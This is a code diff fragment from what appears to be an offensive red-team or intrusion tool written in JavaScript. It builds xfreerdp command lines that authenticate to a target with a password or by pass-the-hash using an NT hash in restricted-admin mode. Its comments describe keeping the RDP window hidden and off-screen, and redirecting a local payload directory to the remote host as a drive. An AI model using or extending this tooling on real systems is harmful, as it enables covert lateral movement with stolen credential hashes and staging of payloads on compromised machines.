@@ -15577,7 +15577,7 @@ async function ipcRun(action) {
     const rdpCreds = usePTH ? `/pth:${ntHash} /restricted-admin` : `/p:'${a.pass}'`;
     const rdpBase  = `xfreerdp /v:${a.target} /u:'${a.user}' ${rdpCreds} /cert:ignore`;
     // +disable-output disables all graphics decoding; 1x1 window off-screen avoids visual disruption.
-    const rdpTail  = `/w:1 /h:1 /window-position:-9999x-9999 +disable-output -decorations /log-level:OFF`;
+    const rdpTail  = `/w:1 /h:1 +disable-output -decorations /log-level:OFF`;
 
     if (method === 'rdp-drive' || method === 'rdp-drive-pth') {
       // Mount local payload dir as \\tsclient\upload\ via FUSE drive redirection.
